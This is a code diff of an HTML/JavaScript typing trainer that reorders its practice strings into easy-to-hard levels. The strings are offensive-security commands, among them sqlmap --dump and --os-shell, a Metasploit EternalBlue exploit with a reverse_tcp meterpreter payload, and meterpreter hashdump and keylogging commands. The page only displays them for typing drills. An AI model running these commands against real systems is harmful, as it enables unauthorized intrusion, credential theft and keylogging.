@@ -63,7 +63,6 @@ select,button,input{
   <option value="meterpreter">Meterpreter</option>
 </select>
 
-<button id="skipBtn">Skip</button>
 <button id="resetBtn">Restart</button>
 </div>
 
@@ -74,129 +73,147 @@ select,button,input{
 </div>
 
 <script>
-/* ===== COMMAND DATABASE ===== */
+/* ===== PROGRESSIVE COMMANDS ===== */
 const commands = {
-linux:[
-  "whoami","id","pwd","ls -la","cd /var/www/html","cat /etc/passwd",
-  "history | tail","ps aux","df -h","du -sh *","chmod +x exploit.sh","sudo -l"
+linux: [
+  // Easy
+  "whoami",
+  "pwd",
+  "ls",
+
+  // Medium
+  "ls -la",
+  "cd /var/www/html",
+  "ps aux",
+
+  // Hard
+  "find / -type f -name passwd 2>/dev/null",
+  "chmod +x exploit.sh",
+  "sudo -l"
 ],
-nmap:[
-  "nmap 192.168.1.1","nmap -sS 192.168.1.1","nmap -sV 192.168.1.1",
-  "nmap -A 192.168.1.1","nmap -p 22,80,443 192.168.1.1",
-  "nmap -p- 192.168.1.1",
-  "nmap -sS -sV -O -p 1-65535 192.168.1.1",
-  "nmap --script vuln 192.168.1.1","nmap -T4 -Pn 192.168.1.1",
-  "nmap -oN scan.txt 192.168.1.1"
+
+nmap: [
+  // Easy
+  "nmap 192.168.1.1",
+  "nmap -sS 192.168.1.1",
+
+  // Medium
+  "nmap -sV 192.168.1.1",
+  "nmap -p 22,80,443 192.168.1.1",
+
+  // Hard
+  "nmap -A 192.168.1.1",
+  "nmap -sS -sV -O -p 1-65535 192.168.1.1"
 ],
-sqlmap:[
+
+sqlmap: [
+  // Easy
   "sqlmap -u http://site.com/index.php?id=1",
+
+  // Medium
   "sqlmap -u http://site.com/index.php?id=1 --dbs",
   "sqlmap -u http://site.com/index.php?id=1 --tables",
-  "sqlmap -u http://site.com/index.php?id=1 --columns",
+
+  // Hard
   "sqlmap -u http://site.com/index.php?id=1 --dump",
-  "sqlmap -u http://site.com/index.php?id=1 --batch",
-  "sqlmap -u http://site.com/index.php?id=1 --risk=3 --level=5",
-  "sqlmap -r request.txt",
-  "sqlmap -r request.txt --dbs",
-  "sqlmap -r request.txt --dump"
+  "sqlmap --os-shell -u http://site.com/index.php?id=1"
 ],
-metasploit:[
-  "msfconsole","search smb",
+
+metasploit: [
+  // Easy
+  "msfconsole",
+  "search smb",
+
+  // Medium
   "use exploit/windows/smb/ms17_010_eternalblue",
   "show options",
+
+  // Hard
   "set RHOSTS 192.168.1.10",
-  "set LHOST 192.168.1.5",
   "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-  "exploit","sessions","sessions -i 1"
+  "exploit"
 ],
-meterpreter:[
-  "sysinfo","getuid","ps","shell","pwd","ls","cd ..",
-  "upload file.txt","download secret.txt","screenshot",
-  "keyscan_start","keyscan_dump","keyscan_stop",
-  "hashdump","background"
+
+meterpreter: [
+  // Easy
+  "sysinfo",
+  "getuid",
+
+  // Medium
+  "ps",
+  "shell",
+
+  // Hard
+  "hashdump",
+  "keyscan_start",
+  "keyscan_dump"
 ]
 };
 
 /* ===== CORE LOGIC ===== */
-let target="", typed="";
-let done=0, total=15, errors=0;
-let locked=false;
-let lastCommand="";
+let index = 0;
+let target = "";
+let typed = "";
+let locked = false;
 
-function pickCommand(){
-  const tool=document.getElementById("tool").value;
-  const list=commands[tool];
-  let cmd;
-  do {
-    cmd = list[Math.floor(Math.random()*list.length)];
-  } while (cmd === lastCommand && list.length > 1);
-  lastCommand = cmd;
-  return cmd;
+function loadCommand(){
+  const tool = document.getElementById("tool").value;
+  const list = commands[tool];
+
+  if(index >= list.length){
+    document.getElementById("stats").innerHTML =
+      "🎉 Tool Complete – You finished all levels";
+    return;
+  }
+
+  target = list[index];
+  typed = "";
+  locked = false;
+  document.getElementById("input").value = "";
+  render();
+  document.getElementById("bar").style.width =
+    `${(index/list.length)*100}%`;
 }
 
 function render(){
   let html="";
   for(let i=0;i<target.length;i++){
     if(i<typed.length){
-      html+= typed[i]===target[i]
+      html += typed[i] === target[i]
         ? `<span class="correct">${target[i]}</span>`
         : `<span class="wrong">${target[i]}</span>`;
     }else{
-      html+= `<span class="pending">${target[i]}</span>`;
+      html += `<span class="pending">${target[i]}</span>`;
     }
   }
-  document.getElementById("command").innerHTML=html;
+  document.getElementById("command").innerHTML = html;
 }
 
-function nextCommand(){
-  locked=false;
-  target=pickCommand();
-  typed="";
-  document.getElementById("input").value="";
-  render();
-  document.getElementById("bar").style.width=`${(done/total)*100}%`;
-}
-
-document.getElementById("input").addEventListener("input",e=>{
+document.getElementById("input").addEventListener("input", e=>{
   if(locked) return;
-  typed=e.target.value;
+  typed = e.target.value;
   render();
-  if(!target.startsWith(typed)) errors++;
-  if(typed===target){
-    locked=true;
-    done++;
-    if(done>=total){
-      document.getElementById("stats").innerHTML=
-        `✔ Session Complete | Accuracy ${Math.max(0,100-errors)}%`;
-      return;
-    }
-    setTimeout(nextCommand,500);
+
+  if(typed === target){
+    locked = true;
+    index++;
+    setTimeout(loadCommand, 500);
   }
 });
 
-document.getElementById("skipBtn").onclick=()=>{
-  if(locked) return;
-  locked=true;
-  done++;
-  errors+=target.length;
-  nextCommand();
+document.getElementById("resetBtn").onclick = ()=>{
+  index = 0;
+  document.getElementById("stats").textContent = "";
+  loadCommand();
 };
 
-document.getElementById("resetBtn").onclick=()=>{
-  done=0; errors=0; locked=false;
-  document.getElementById("bar").style.width="0%";
-  document.getElementById("stats").textContent="";
-  nextCommand();
+document.getElementById("tool").onchange = ()=>{
+  index = 0;
+  document.getElementById("stats").textContent = "";
+  loadCommand();
 };
 
-document.getElementById("tool").onchange=()=>{
-  done=0; errors=0; locked=false;
-  document.getElementById("bar").style.width="0%";
-  document.getElementById("stats").textContent="";
-  nextCommand();
-};
-
-nextCommand();
+loadCommand();
 </script>
 
 </body>
